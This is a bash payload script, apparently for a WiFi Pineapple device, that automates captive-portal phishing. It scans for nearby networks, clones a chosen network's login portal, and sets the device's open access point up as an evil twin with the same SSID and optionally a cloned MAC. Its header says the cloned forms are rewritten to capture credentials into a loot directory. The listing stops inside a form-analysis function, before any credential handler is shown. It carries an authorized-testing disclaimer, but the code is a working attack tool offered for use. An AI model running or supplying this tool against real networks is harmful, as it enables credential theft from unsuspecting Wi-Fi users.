#!/bin/bash
# Title: Clone Captive Portal
# Description: Scan for SSIDs, connect to selected network, detect and clone captive portal
# Purpose: Automate captive portal reconnaissance and cloning for authorized security assessments
# Author: WiFi Pineapple Pager Community
# Version: 1.0
# Category: interception

# IMPORTANT! As of Pager Firmware 1.0.4 the opkg source list is broken with a missing repository.
# To fix, comment out or remove the offending line (Hak5) in /etc/opkg/distfeeds.conf before installing packages.

# =============================================================================
# EDUCATIONAL USE
# =============================================================================
# This payload is intended for educational and authorized security testing purposes only.
# It demonstrates how captive portals work and how they can be cloned for security research.
# Always obtain proper authorization before using this tool on any network.

# =============================================================================
# RED TEAM USE
# =============================================================================
# For authorized red team engagements, this payload provides end-to-end automation:
#   1. Scan for nearby WiFi networks with captive portals
#   2. Connect to target network and detect portal presence
#   3. Clone portal HTML/CSS/JS to /www/goodportal/{ssid}_{timestamp}/
#   4. Auto-modify forms to capture credentials via /captiveportal/ endpoint
#   5. Configure Open AP as evil twin (same SSID, optional MAC clone)
#   6. Optionally add SSID to pool for future use
#
# Cloned portals are compatible with:
#   - goodportal_configure payload (recommended)
#   - EvilPortals collection format (github.com/kleo/evilportals)
#
# Credentials captured by goodportal are saved to:
#   /root/loot/goodportal/credentials_YYYY-MM-DD_HH-MM-SS.log

# =============================================================================
# DESIGN PRINCIPLES
# =============================================================================
#   - Save and restore interface state on exit (cleanup trap)
#   - Save and restore Open AP config if modified
#   - User confirmation before destructive actions
#   - Auto-install missing dependencies with user consent
#   - Compatible with goodportal and evilportals ecosystems
#   - Fallback methods (wget -> curl) for portal cloning
#   - Handle both open and WPA-protected networks

# =============================================================================
# WORKFLOW
# =============================================================================
#   Phase 1: Scan for SSIDs using wlan1 (up to 20 networks, sorted by signal)
#   Phase 2: User selects target network from numbered list
#   Phase 3: Connect to network (open or WPA with password prompt)
#   Phase 4: Detect captive portal via standard detection URLs
#   Phase 5: Clone portal recursively (HTML, CSS, JS, images)
#   Phase 6: Create credential capture handler (PHP wrapper)
#   Phase 7: Configure evil twin (Open AP SSID/MAC, SSID Pool)

# =============================================================================
# DEPENDENCIES
# =============================================================================
#   - iw (WiFi scanning and interface management)
#   - wpa_supplicant (network connection)
#   - curl (portal detection and fallback cloning)
#   - wget (recursive portal cloning - installed if missing)

# =============================================================================
# CHANGELOG (update in README.md as well!)
# =============================================================================
#   1.0 - Initial release
#       - SSID scanning with signal strength sorting
#       - Open and WPA network connection support
#       - Captive portal detection via multiple endpoints
#       - Recursive portal cloning with wget/curl fallback
#       - Form action modification for credential capture
#       - PHP credential handler with login overlay fallback
#       - Interface state save/restore
#       - Open AP configuration via UCI (persistent)
#       - MAC cloning option for full evil twin
#       - SSID Pool integration
#       - Open AP config backup/restore

# =============================================================================
# TODO
# =============================================================================
#   - Support for 802.1X/Enterprise network authentication
#   - Automatic goodportal_configure integration (start portal after clone)
#   - JavaScript-based portal detection for SPAs
#   - Option to clone multiple pages (follow links)
#   - Certificate cloning for HTTPS portals

# =============================================================================
# CONFIGURATION
# =============================================================================
INTERFACE="wlan0cli"
LOOT_DIR="/root/loot/captive_portals"
PORTAL_DIR="/www/goodportal"
TEMP_DIR="/tmp/clone_portal"
WPA_CONF="/tmp/clone_portal_wpa.conf"
WPA_CTRL="/tmp/clone_portal_wpa"
TIMEOUT=15
MAX_SSIDS=20

# Original interface state (saved before modification)
ORIGINAL_IFACE_STATE=""
ORIGINAL_IFACE_MODE=""
ORIGINAL_IFACE_UP=""
ORIGINAL_WPA_PID=""

# Captive portal detection URLs (standard endpoints)
# HTTP endpoints (most common)
DETECTION_URLS_HTTP=(
    "http://connectivitycheck.gstatic.com/generate_204"
    "http://www.gstatic.com/generate_204"
    "http://clients3.google.com/generate_204"
    "http://captive.apple.com/hotspot-detect.html"
    "http://www.apple.com/library/test/success.html"
    "http://detectportal.firefox.com/success.txt"
    "http://www.msftconnecttest.com/connecttest.txt"
)

# HTTPS endpoints (for HTTPS-only portals)
DETECTION_URLS_HTTPS=(
    "https://www.google.com/generate_204"
    "https://captive.apple.com/hotspot-detect.html"
    "https://www.apple.com/library/test/success.html"
    "https://detectportal.firefox.com/success.txt"
)

# Known DNS resolution targets for DNS hijack detection
DNS_CHECK_DOMAINS=(
    "www.google.com:142.250"
    "www.apple.com:17.253"
    "www.microsoft.com:20.70"
)

# Headless browser option (requires phantomjs or playwright)
USE_HEADLESS_BROWSER=0
HEADLESS_AVAILABLE=0
HEADLESS_TOOL=""

# Cookie jar for session preservation
COOKIE_JAR="/tmp/clone_portal_cookies.txt"

# User agents for rotation
USER_AGENTS=(
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
)
CURRENT_USER_AGENT=""

# Signal strength filter (dBm, networks weaker than this are hidden)
MIN_SIGNAL_STRENGTH=-85
FILTER_WEAK_SIGNALS=0

# Band selection (all, 2.4, 5)
BAND_FILTER="all"

# Multi-language portal detection keywords
PORTAL_KEYWORDS_EN="login|sign.?in|connect|accept|terms|captive|portal|authenticate|wifi|password|username|email"
PORTAL_KEYWORDS_ES="iniciar|sesion|conectar|aceptar|terminos|contraseña|usuario|correo"
PORTAL_KEYWORDS_FR="connexion|connecter|accepter|conditions|mot.?de.?passe|utilisateur"
PORTAL_KEYWORDS_DE="anmelden|verbinden|akzeptieren|bedingungen|passwort|benutzer"
PORTAL_KEYWORDS_ALL="$PORTAL_KEYWORDS_EN|$PORTAL_KEYWORDS_ES|$PORTAL_KEYWORDS_FR|$PORTAL_KEYWORDS_DE"

# Known portal templates for detection
PORTAL_TEMPLATES=(
    "cisco:Cisco Systems|cisco.com|CiscoWebAuth"
    "aruba:Aruba Networks|arubanetworks.com|aruba_captive"
    "meraki:Meraki|meraki.com|splash_auth"
    "unifi:Ubiquiti|unifi.ui.com|UniFi"
    "ruckus:Ruckus|ruckuswireless|ruckus_captive"
    "fortinet:FortiGate|fortinet.com|fgt_redirect"
    "paloalto:Palo Alto|paloaltonetworks|pan_captive"
    "mikrotik:MikroTik|mikrotik.com|hotspot"
    "openwrt:OpenWrt|openwrt.org|luci"
    "coova:CoovaChilli|coova.org|uamip"
)

# Logging
LOG_FILE=""
LOG_TO_FILE=1

# Rate limiting
RATE_LIMIT_DELAY=2
MAX_RETRIES=3

# Configuration persistence
CONFIG_FILE="/root/.clone_portal_config"

# Session handling
SESSION_CHECK_INTERVAL=30
SESSION_LAST_CHECK=0

# Response time tracking
RESPONSE_TIMES=()

# Known tracking/analytics domains to sanitize
TRACKING_DOMAINS=(
    "google-analytics.com"
    "googletagmanager.com"
    "facebook.net"
    "doubleclick.net"
    "hotjar.com"
    "mixpanel.com"
    "segment.io"
    "amplitude.com"
    "heap.io"
    "fullstory.com"
    "mouseflow.com"
    "crazyegg.com"
    "optimizely.com"
    "newrelic.com"
    "pingdom.com"
)

# API endpoint patterns
API_PATTERNS=(
    "/api/"
    "/rest/"
    "/v1/"
    "/v2/"
    "/auth/"
    "/login"
    "/authenticate"
    "/session"
    "/token"
    "\.json$"
    "XMLHttpRequest"
    "fetch\\("
    "axios"
    "\\$.ajax"
    "\\$.post"
    "\\$.get"
)

# =============================================================================
# SAVE/RESTORE INTERFACE STATE
# =============================================================================
save_interface_state() {
    LOG "Saving original interface state..."
    
    # Check if interface exists
    if ! ip link show "$INTERFACE" >/dev/null 2>&1; then
        LOG yellow "  Interface $INTERFACE not found"
        return 1
    fi
    
    # Save if interface is up or down
    if ip link show "$INTERFACE" | grep -q "state UP"; then
        ORIGINAL_IFACE_UP="up"
    else
        ORIGINAL_IFACE_UP="down"
    fi
    
    # Save interface mode (monitor, managed, etc.)
    ORIGINAL_IFACE_MODE=$(iw dev "$INTERFACE" info 2>/dev/null | grep "type" | awk '{print $2}')
    if [ -z "$ORIGINAL_IFACE_MODE" ]; then
        ORIGINAL_IFACE_MODE="managed"
    fi
    
    # Check if there's an existing wpa_supplicant for this interface
    ORIGINAL_WPA_PID=$(ps | grep "wpa_supplicant" | grep "$INTERFACE" | grep -v "clone_portal" | grep -v grep | awk '{print $1}' | head -1)
    
    # Save connection info if connected
    ORIGINAL_IFACE_STATE=$(wpa_cli -i "$INTERFACE" status 2>/dev/null | grep -E "^(ssid|bssid|wpa_state)=" || echo "")
    
    LOG "  Mode: $ORIGINAL_IFACE_MODE"
    LOG "  State: $ORIGINAL_IFACE_UP"
    if [ -n "$ORIGINAL_WPA_PID" ]; then
        LOG "  Existing wpa_supplicant PID: $ORIGINAL_WPA_PID"
    fi
}

restore_interface_state() {
    LOG "Restoring interface to original state..."
    
    # Kill wpa_supplicant we started
    if [ -f /tmp/clone_portal_wpa.pid ]; then
        kill "$(cat /tmp/clone_portal_wpa.pid)" 2>/dev/null
        rm -f /tmp/clone_portal_wpa.pid
    fi
    
    # Kill any wpa_supplicant using our config
    for pid in $(ps | grep "wpa_supplicant" | grep "clone_portal" | grep -v grep | awk '{print $1}'); do
        kill -9 "$pid" 2>/dev/null
    done
    
    # Release DHCP lease we obtained
    ip addr flush dev "$INTERFACE" 2>/dev/null
    
    # Restore interface mode
    ip link set "$INTERFACE" down 2>/dev/null
    if [ -n "$ORIGINAL_IFACE_MODE" ]; then
        iw dev "$INTERFACE" set type "$ORIGINAL_IFACE_MODE" 2>/dev/null
        LOG "  Restored mode: $ORIGINAL_IFACE_MODE"
    else
        iw dev "$INTERFACE" set type managed 2>/dev/null
    fi
    
    # Restore interface up/down state
    if [ "$ORIGINAL_IFACE_UP" = "up" ]; then
        ip link set "$INTERFACE" up 2>/dev/null
        LOG "  Interface brought up"
    fi
    
    # If there was an original wpa_supplicant, it should still be running
    # (we only killed our own clone_portal wpa_supplicant)
    if [ -n "$ORIGINAL_WPA_PID" ]; then
        if ps | grep -q "^\s*$ORIGINAL_WPA_PID"; then
            LOG "  Original wpa_supplicant still running"
        else
            LOG yellow "  Original wpa_supplicant was terminated - manual reconnection may be needed"
        fi
    fi
}

# =============================================================================
# OPEN AP CONFIGURATION (UCI-based, persistent)
# =============================================================================
OPEN_AP_IFACE="wlan0open"
ORIGINAL_OPEN_AP_SSID=""
ORIGINAL_OPEN_AP_MAC=""
ORIGINAL_OPEN_AP_DISABLED=""

get_open_ap_config() {
    ORIGINAL_OPEN_AP_SSID=$(uci get wireless.wlan0open.ssid 2>/dev/null)
    ORIGINAL_OPEN_AP_MAC=$(uci get wireless.wlan0open.macaddr 2>/dev/null)
    ORIGINAL_OPEN_AP_DISABLED=$(uci get wireless.wlan0open.disabled 2>/dev/null)
}

backup_open_ap_config() {
    LOG "Backing up Open AP config..."
    get_open_ap_config
    echo "$ORIGINAL_OPEN_AP_SSID" > /tmp/clone_portal_backup_ssid
    echo "$ORIGINAL_OPEN_AP_MAC" > /tmp/clone_portal_backup_mac
    echo "$ORIGINAL_OPEN_AP_DISABLED" > /tmp/clone_portal_backup_disabled
    LOG "  SSID: $ORIGINAL_OPEN_AP_SSID"
    LOG "  MAC:  $ORIGINAL_OPEN_AP_MAC"
}

set_open_ap() {
    local ssid="$1"
    local mac="$2"
    
    LOG "Configuring Open AP..."
    
    # Set SSID
    uci set wireless.wlan0open.ssid="$ssid"
    LOG "  SSID: $ssid"
    
    # Set MAC if provided
    if [ -n "$mac" ]; then
        uci set wireless.wlan0open.macaddr="$mac"
        LOG "  MAC:  $mac"
    fi
    
    # Enable Open AP
    uci set wireless.wlan0open.disabled='0'
    
    # Commit to flash
    uci commit wireless
    
    # Apply changes
    wifi reload
    sleep 2
    
    LOG green "  Open AP configured!"
}

restore_open_ap_config() {
    if [ -f "/tmp/clone_portal_backup_ssid" ]; then
        LOG "Restoring Open AP config..."
        local orig_ssid
        local orig_mac
        local orig_disabled
        orig_ssid=$(cat /tmp/clone_portal_backup_ssid)
        orig_mac=$(cat /tmp/clone_portal_backup_mac 2>/dev/null)
        orig_disabled=$(cat /tmp/clone_portal_backup_disabled 2>/dev/null)
        
        [ -n "$orig_ssid" ] && uci set wireless.wlan0open.ssid="$orig_ssid"
        [ -n "$orig_mac" ] && uci set wireless.wlan0open.macaddr="$orig_mac"
        [ -n "$orig_disabled" ] && uci set wireless.wlan0open.disabled="$orig_disabled"
        
        uci commit wireless
        wifi reload
        
        rm -f /tmp/clone_portal_backup_*
        LOG green "  Open AP restored: $orig_ssid"
    fi
}

# =============================================================================
# CLEANUP HANDLER
# =============================================================================
cleanup() {
    LOG "Cleaning up..."
    
    # Restore interface to original state
    restore_interface_state
    
    # Clean temp files
    rm -rf "$WPA_CTRL" 2>/dev/null
    rm -f "$WPA_CONF" 2>/dev/null
    rm -rf "$TEMP_DIR/clone" 2>/dev/null
    
    led_off
}
trap cleanup EXIT INT TERM

# =============================================================================
# LED PATTERNS
# =============================================================================
# === LED CONTROL ===
led_pattern() {
    . /lib/hak5/commands.sh
    HAK5_API_POST "system/led" "$1" >/dev/null 2>&1
}

led_off() {
    led_pattern '{"color":"custom","raw_pattern":[{"onms":100,"offms":0,"next":false,"rgb":{"1":[false,false,false],"2":[false,false,false],"3":[false,false,false],"4":[false,false,false]}}]}'
}

led_scanning() {
    led_pattern '{"color":"custom","raw_pattern":[{"onms":500,"offms":500,"next":true,"rgb":{"1":[false,false,true],"2":[false,false,true],"3":[false,false,false],"4":[false,false,false]}},{"onms":500,"offms":0,"next":false,"rgb":{"1":[false,false,false],"2":[false,false,false],"3":[false,false,false],"4":[false,false,false]}}]}'
}

led_found() {
    led_pattern '{"color":"custom","raw_pattern":[{"onms":2000,"offms":0,"next":false,"rgb":{"1":[true,false,false],"2":[true,false,false],"3":[true,false,false],"4":[true,false,false]}}]}'
}

led_success() {
    led_pattern '{"color":"custom","raw_pattern":[{"onms":2000,"offms":0,"next":false,"rgb":{"1":[false,true,false],"2":[false,true,false],"3":[false,true,false],"4":[false,true,false]}}]}'
}

led_connecting() {
    led_pattern '{"color":"custom","raw_pattern":[{"onms":2000,"offms":0,"next":false,"rgb":{"1":[false,true,false],"2":[false,true,false],"3":[false,true,false],"4":[false,true,false]}}]}'
}

led_cloning() {
    led_pattern '{"color":"custom","raw_pattern":[{"onms":2000,"offms":0,"next":false,"rgb":{"1":[false,true,false],"2":[false,true,false],"3":[false,true,false],"4":[false,true,false]}}]}'
}

led_fail() {
    LED FAIL
}

# =============================================================================
# UTILITY FUNCTIONS
# =============================================================================

# Sanitize SSID for use as directory name
sanitize_ssid() {
    local ssid="$1"
    # Replace spaces and special chars with underscores
    echo "$ssid" | tr -cs 'a-zA-Z0-9_-' '_' | sed 's/_*$//' | head -c 50
}

# Initialize logging to file
init_logging() {
    if [ "$LOG_TO_FILE" -eq 1 ]; then
        local timestamp
        timestamp=$(date +%Y%m%d_%H%M%S)
        LOG_FILE="$LOOT_DIR/clone_${timestamp}.log"
        mkdir -p "$LOOT_DIR"
        echo "=== Clone Captive Portal Log ===" > "$LOG_FILE"
        echo "Started: $(date)" >> "$LOG_FILE"
        echo "================================" >> "$LOG_FILE"
    fi
}

# Log message to both screen and file
log_to_file() {
    local msg="$1"
    if [ "$LOG_TO_FILE" -eq 1 ] && [ -n "$LOG_FILE" ]; then
        echo "[$(date +%H:%M:%S)] $msg" >> "$LOG_FILE" 2>/dev/null
    fi
}

# Get random user agent
get_random_user_agent() {
    local count=${#USER_AGENTS[@]}
    local idx=$((RANDOM % count))
    CURRENT_USER_AGENT="${USER_AGENTS[$idx]}"
    echo "$CURRENT_USER_AGENT"
}

# Rotate to next user agent
rotate_user_agent() {
    get_random_user_agent >/dev/null
    log_to_file "User agent rotated: ${CURRENT_USER_AGENT:0:50}..."
}

# Make HTTP request with cookies and user agent
http_request() {
    local url="$1"
    local output_file="$2"
    local follow_redirects="${3:-1}"
    local retries=0
    local http_code=""
    
    [ -z "$CURRENT_USER_AGENT" ] && get_random_user_agent >/dev/null
    
    while [ $retries -lt $MAX_RETRIES ]; do
        local curl_opts="-s -m $TIMEOUT"
        curl_opts="$curl_opts -A \"$CURRENT_USER_AGENT\""
        curl_opts="$curl_opts -c \"$COOKIE_JAR\" -b \"$COOKIE_JAR\""
        
        [ "$follow_redirects" -eq 1 ] && curl_opts="$curl_opts -L"
        
        if [ -n "$output_file" ]; then
            http_code=$(eval curl $curl_opts -o "\"$output_file\"" -w "%{http_code}" "\"$url\"" 2>/dev/null)
        else
            http_code=$(eval curl $curl_opts -o /dev/null -w "%{http_code}" "\"$url\"" 2>/dev/null)
        fi
        
        # Check for rate limiting
        if [ "$http_code" = "429" ]; then
            log_to_file "Rate limited (429), waiting ${RATE_LIMIT_DELAY}s..."
            sleep $RATE_LIMIT_DELAY
            # Cap delay at 30 seconds to avoid excessive waits
            if [ $RATE_LIMIT_DELAY -lt 30 ]; then
                RATE_LIMIT_DELAY=$((RATE_LIMIT_DELAY * 2))
            fi
            retries=$((retries + 1))
            rotate_user_agent
        else
            break
        fi
    done
    
    echo "$http_code"
}

# Detect portal template from content
detect_portal_template() {
    local content="$1"
    local detected=""
    
    for template in "${PORTAL_TEMPLATES[@]}"; do
        local name="${template%%:*}"
        local patterns="${template#*:}"
        
        if echo "$content" | grep -qiE "$patterns"; then
            detected="$name"
            log_to_file "Portal template detected: $name"
            break
        fi
    done
    
    echo "$detected"
}

# Take screenshot with headless browser
take_portal_screenshot() {
    local url="$1"
    local output_file="$2"
    
    if [ "$HEADLESS_AVAILABLE" -eq 0 ]; then
        return 1
    fi
    
    log_to_file "Taking screenshot: $url"
    
    case "$HEADLESS_TOOL" in
        phantomjs)
            cat > /tmp/phantom_screenshot.js << 'JSEOF'
var page = require('webpage').create();
var system = require('system');
var url = system.args[1];
var output = system.args[2];

page.viewportSize = { width: 375, height: 667 };
page.settings.userAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)';

page.open(url, function(status) {
    if (status === 'success') {
        setTimeout(function() {
            page.render(output);
            phantom.exit(0);
        }, 2000);
    } else {
        phantom.exit(1);
    }
});
JSEOF
            timeout 15 phantomjs /tmp/phantom_screenshot.js "$url" "$output_file" 2>/dev/null
            rm -f /tmp/phantom_screenshot.js
            ;;
        chromium)
            timeout 15 chromium --headless --disable-gpu --screenshot="$output_file" \
                --window-size=375,667 "$url" 2>/dev/null
            ;;
    esac
    
    [ -f "$output_file" ]
}

# Inline external assets (CSS, JS, images) into HTML
inline_assets() {
    local html_file="$1"
    local base_url="$2"
    local temp_file="/tmp/inline_temp.html"
    
    log_to_file "Inlining assets for: $html_file"
    
    # Inline CSS files
    while IFS= read -r css_url; do
        [ -z "$css_url" ] && continue
        
        # Make URL absolute if relative
        if [[ "$css_url" =~ ^/ ]]; then
            css_url="${base_url}${css_url}"
        elif [[ ! "$css_url" =~ ^https?:// ]]; then
            css_url="${base_url}/${css_url}"
        fi
        
        local css_content
        css_content=$(curl -s -m 5 "$css_url" 2>/dev/null)
        
        if [ -n "$css_content" ]; then
            # Escape for sed
            css_content=$(echo "$css_content" | sed 's/[&/\]/\\&/g' | tr '\n' ' ')
            sed -i "s|<link[^>]*href=[\"']${css_url}[\"'][^>]*>|<style>$css_content</style>|gi" "$html_file" 2>/dev/null
        fi
    done < <(grep -i "\.css" "$html_file" 2>/dev/null | sed -E 's/.*href=["\x27]([^"\x27]+\.css[^"\x27]*)["\x27].*/\1/' | grep -v "^<")
    
    # Inline small images as base64 (< 50KB)
    while IFS= read -r img_url; do
        [ -z "$img_url" ] && continue
        
        if [[ "$img_url" =~ ^/ ]]; then
            img_url="${base_url}${img_url}"
        elif [[ ! "$img_url" =~ ^https?:// ]]; then
            img_url="${base_url}/${img_url}"
        fi
        
        # Download and check size
        local img_file="/tmp/inline_img_$$"
        curl -s -m 5 -o "$img_file" "$img_url" 2>/dev/null
        
        if [ -f "$img_file" ]; then
            local size
            size=$(stat -f%z "$img_file" 2>/dev/null || stat -c%s "$img_file" 2>/dev/null)
            
            if [ "${size:-0}" -lt 51200 ]; then
                local mime_type="image/png"
                [[ "$img_url" =~ \.jpe?g$ ]] && mime_type="image/jpeg"
                [[ "$img_url" =~ \.gif$ ]] && mime_type="image/gif"
                [[ "$img_url" =~ \.svg$ ]] && mime_type="image/svg+xml"
                
                local base64_data
                base64_data=$(base64 -w0 "$img_file" 2>/dev/null || base64 "$img_file" 2>/dev/null)
                
                if [ -n "$base64_data" ]; then
                    sed -i "s|$img_url|data:$mime_type;base64,$base64_data|g" "$html_file" 2>/dev/null
                fi
            fi
            rm -f "$img_file"
        fi
    done < <(grep -iE '\.(png|jpg|jpeg|gif|svg)' "$html_file" 2>/dev/null | sed -E "s/.*src=[\"']([^\"']+\.(png|jpg|jpeg|gif|svg)[^\"']*)[\"'].*/\1/" | grep -v "^<" | head -20)
    
    log_to_file "Asset inlining complete"
}

# Verify cloned portal renders correctly
verify_portal() {
    local portal_dir="$1"
    local index_file=""
    
    # Find index file
    if [ -f "$portal_dir/index.php" ]; then
        index_file="$portal_dir/index.php"
    elif [ -f "$portal_dir/index.html" ]; then
        index_file="$portal_dir/index.html"
    else
        index_file=$(find "$portal_dir" -name "*.html" -o -name "*.php" | head -1)
    fi
    
    if [ -z "$index_file" ] || [ ! -f "$index_file" ]; then
        log_to_file "Verification failed: No index file found"
        return 1
    fi
    
    local issues=0
    
    # Check for essential elements
    if ! grep -qi "<html" "$index_file"; then
        log_to_file "Warning: Missing <html> tag"
        issues=$((issues + 1))
    fi
    
    if ! grep -qi "<body" "$index_file"; then
        log_to_file "Warning: Missing <body> tag"
        issues=$((issues + 1))
    fi
    
    # Check for forms
    local form_count
    form_count=$(grep -ci "<form" "$index_file" 2>/dev/null || echo "0")
    log_to_file "Forms found: $form_count"
    
    # Check for broken references
    local broken_refs
    broken_refs=$(grep -oP 'src=["\x27]\K[^"\x27]+' "$index_file" 2>/dev/null | while read -r ref; do
        if [[ "$ref" =~ ^https?:// ]]; then
            echo "$ref"
        elif [[ "$ref" =~ ^data: ]]; then
            continue
        elif [ ! -f "$portal_dir/$ref" ]; then
            echo "$ref"
        fi
    done | wc -l)
    
    log_to_file "Potentially broken references: $broken_refs"
    
    if [ "$issues" -eq 0 ]; then
        log_to_file "Portal verification: PASSED"
        return 0
    else
        log_to_file "Portal verification: $issues issues found"
        return 1
    fi
}

# Filter networks by signal strength
filter_by_signal() {
    local input_file="$1"
    local output_file="$2"
    
    if [ "$FILTER_WEAK_SIGNALS" -eq 0 ]; then
        cp "$input_file" "$output_file"
        return
    fi
    
    while IFS='|' read -r signal ssid bssid channel; do
        # Signal is already in dBm (negative number)
        if [ "${signal:--100}" -ge "$MIN_SIGNAL_STRENGTH" ]; then
            echo "$signal|$ssid|$bssid|$channel"
        fi
    done < "$input_file" > "$output_file"
    
    log_to_file "Filtered networks: $(wc -l < "$input_file") -> $(wc -l < "$output_file")"
}

# Filter networks by band (2.4GHz or 5GHz)
filter_by_band() {
    local input_file="$1"
    local output_file="$2"
    
    if [ "$BAND_FILTER" = "all" ]; then
        cp "$input_file" "$output_file"
        return
    fi
    
    while IFS='|' read -r signal ssid bssid channel; do
        local ch="${channel:-0}"
        
        case "$BAND_FILTER" in
            "2.4")
                # 2.4GHz channels: 1-14
                if [ "$ch" -ge 1 ] && [ "$ch" -le 14 ]; then
                    echo "$signal|$ssid|$bssid|$channel"
                fi
                ;;
            "5")
                # 5GHz channels: 36+
                if [ "$ch" -ge 36 ]; then
                    echo "$signal|$ssid|$bssid|$channel"
                fi
                ;;
        esac
    done < "$input_file" > "$output_file"
    
    log_to_file "Band filtered ($BAND_FILTER): $(wc -l < "$input_file") -> $(wc -l < "$output_file")"
}

# =============================================================================
# V1.3 ENHANCEMENT FUNCTIONS
# =============================================================================

# Save configuration to file for persistence
save_config() {
    LOG "Saving configuration..."
    cat > "$CONFIG_FILE" << EOF
# Clone Portal Configuration - $(date)
BAND_FILTER="$BAND_FILTER"
FILTER_WEAK_SIGNALS=$FILTER_WEAK_SIGNALS
MIN_SIGNAL_STRENGTH=$MIN_SIGNAL_STRENGTH
USE_HEADLESS_BROWSER=$USE_HEADLESS_BROWSER
CURRENT_USER_AGENT="$CURRENT_USER_AGENT"
EOF
    log_to_file "Configuration saved to $CONFIG_FILE"
}

# Load configuration from file
load_config() {
    if [ -f "$CONFIG_FILE" ]; then
        LOG "Loading saved configuration..."
        # shellcheck source=/dev/null
        source "$CONFIG_FILE"
        log_to_file "Configuration loaded from $CONFIG_FILE"
        return 0
    fi
    return 1
}

# Check network connectivity (for reconnection)
check_connectivity() {
    local test_ip="${GATEWAY:-8.8.8.8}"
    if ping -c1 -W2 "$test_ip" >/dev/null 2>&1; then
        return 0
    fi
    return 1
}

# Auto-reconnect if connection drops
auto_reconnect() {
    local max_attempts=3
    local attempt=0
    
    while [ $attempt -lt $max_attempts ]; do
        if check_connectivity; then
            return 0
        fi
        
        attempt=$((attempt + 1))
        LOG yellow "Connection lost, reconnecting (attempt $attempt/$max_attempts)..."
        log_to_file "Reconnection attempt $attempt"
        
        # Try to reassociate
        wpa_cli -p "$WPA_CTRL" -i "$INTERFACE" reassociate >/dev/null 2>&1
        sleep 3
        
        # Re-obtain IP if needed
        if ! check_connectivity; then
            udhcpc -i "$INTERFACE" -q -n -t 3 >/dev/null 2>&1
            sleep 2
        fi
    done
    
    LOG red "Failed to reconnect after $max_attempts attempts"
    return 1
}

# Detect MAC-based bypass (portal whitelists after first auth)
detect_mac_bypass() {
    local portal_url="$1"
    LOG "Checking for MAC-based bypass..."
    
    # Get our current MAC (BusyBox compatible)
    local our_mac
    our_mac=$(ip link show "$INTERFACE" 2>/dev/null | awk '/link\/ether/ {print $2}')
    log_to_file "Our MAC: $our_mac"
    
    # Try direct internet access without portal auth
    local direct_test
    direct_test=$(curl -s -m 5 -o /dev/null -w "%{http_code}" "http://www.google.com/generate_204" 2>/dev/null)
    
    if [ "$direct_test" = "204" ]; then
        LOG green "  MAC appears to be whitelisted (direct internet access)"
        log_to_file "MAC bypass detected - already whitelisted"
        return 0
    fi
    
    # Check if portal sets any MAC-related cookies
    if [ -f "$COOKIE_JAR" ]; then
        if grep -qiE "(mac|client|device)" "$COOKIE_JAR" 2>/dev/null; then
            LOG yellow "  Portal uses MAC/device cookies"
            log_to_file "MAC-related cookies found"
        fi
    fi
    
    return 1
}

# Extract SSL certificate information
extract_ssl_cert_info() {
    local url="$1"
    local output_file="$2"
    
    # Check if openssl is available
    if [ "$HAVE_OPENSSL" -ne 1 ]; then
        LOG yellow "  OpenSSL not available, skipping SSL cert extraction"
        echo "OpenSSL not available" > "$output_file"
        return 1
    fi
    
    # Extract domain from URL
    local domain
    domain=$(echo "$url" | sed -E 's|https?://([^/:]+).*|\1|')
    
    if [ -z "$domain" ]; then
        return 1
    fi
    
    LOG "Extracting SSL cert info for $domain..."
    
    # Get certificate details
    local cert_info
    cert_info=$(echo | openssl s_client -servername "$domain" -connect "$domain:443" 2>/dev/null | openssl x509 -noout -text 2>/dev/null)
    
    if [ -n "$cert_info" ]; then
        local cn issuer validity
        # Use sed instead of grep -P for BusyBox compatibility
        cn=$(echo "$cert_info" | grep "Subject:" | sed -E 's/.*CN\s*=\s*([^,]+).*/\1/' | head -1)
        issuer=$(echo "$cert_info" | grep "Issuer:" | sed -E 's/.*CN\s*=\s*([^,]+).*/\1/' | head -1)
        validity=$(echo "$cert_info" | grep -A2 "Validity" | tail -2)
        
        cat > "$output_file" << EOF
SSL Certificate Information
===========================
Domain: $domain
Common Name (CN): $cn
Issuer: $issuer
$validity

Full Certificate:
$cert_info
EOF
        
        LOG green "  CN: $cn"
        LOG "  Issuer: $issuer"
        log_to_file "SSL cert extracted: CN=$cn, Issuer=$issuer"
        return 0
    fi
    
    return 1
}

# Detect AJAX/API endpoints in JavaScript
detect_api_endpoints() {
    local portal_dir="$1"
    local output_file="$2"
    
    LOG "Detecting API endpoints..."
    
    local endpoints=()
    local js_files
    js_files=$(find "$portal_dir" -name "*.js" -o -name "*.html" 2>/dev/null)
    
    for file in $js_files; do
        # Look for API patterns
        for pattern in "${API_PATTERNS[@]}"; do
            local matches
            matches=$(grep -oP "$pattern[^\"')\s]*" "$file" 2>/dev/null | sort -u)
            for m in $matches; do
                endpoints+=("$m")
            done
        done
        
        # Look for fetch/XHR URLs
        grep -oP "(fetch|XMLHttpRequest\.open)[^;]*[\"']https?://[^\"']+[\"']" "$file" 2>/dev/null | \
            grep -oP "https?://[^\"']+" >> "$output_file.urls" 2>/dev/null
        
        # Look for axios/jQuery AJAX
        grep -oP "(axios\.(get|post|put)|\\$\.(ajax|get|post))[^;]*[\"'][^\"']+[\"']" "$file" 2>/dev/null | \
            grep -oP "[\"'][^\"']+[\"']" | tr -d "\"'" >> "$output_file.urls" 2>/dev/null
    done
    
    # Deduplicate and save
    if [ -f "$output_file.urls" ]; then
        sort -u "$output_file.urls" > "$output_file"
        rm -f "$output_file.urls"
        local count
        count=$(wc -l < "$output_file")
        LOG green "  Found $count potential API endpoints"
        log_to_file "API endpoints detected: $count"
    else
        echo "No API endpoints detected" > "$output_file"
    fi
}

# Analyze form fields for password, CSRF tokens, etc.
analyze_form_fields() {
    local portal_dir="$1"
    local output_file="$2"
    
    LOG "Analyzing form fields..."
    
